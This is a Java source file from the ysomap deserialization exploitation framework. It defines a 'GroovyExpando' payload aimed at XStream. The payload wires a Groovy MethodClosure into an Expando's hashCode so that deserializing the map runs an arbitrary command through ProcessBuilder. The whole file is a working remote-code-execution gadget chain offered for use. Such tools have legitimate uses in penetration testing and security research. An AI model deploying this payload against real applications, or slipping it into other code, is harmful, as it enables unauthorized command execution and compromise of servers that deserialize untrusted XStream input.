package ysomap.payloads.xstream;

import groovy.util.Expando;
import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.jdk.ProcessBuilderBullet;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.util.HashMap;

/**
 * @author wh1t3P1g
 * @since 2020/4/18
 */
@Payloads
@SuppressWarnings({"rawtypes", "unchecked"})
@Targets({ Targets.XSTREAM })
@Authors({ Authors.WH1T3P1G })
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Require(bullets = {"JdbcRowSetImplBullet", "ProcessBuilderBullet"}, param = false)
public class GroovyExpando extends XStreamPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return ProcessBuilderBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        String action = bullet.get("action");
        MethodClosure methodClosure = new MethodClosure(obj, action);
        Expando expando = new Expando();
        HashMap map = new HashMap<>();
        map.put("hashCode", methodClosure);
        ReflectionHelper.setFieldValue(expando, "expandoProperties", map);

        return PayloadHelper.makeMap("foo",expando);
    }
}
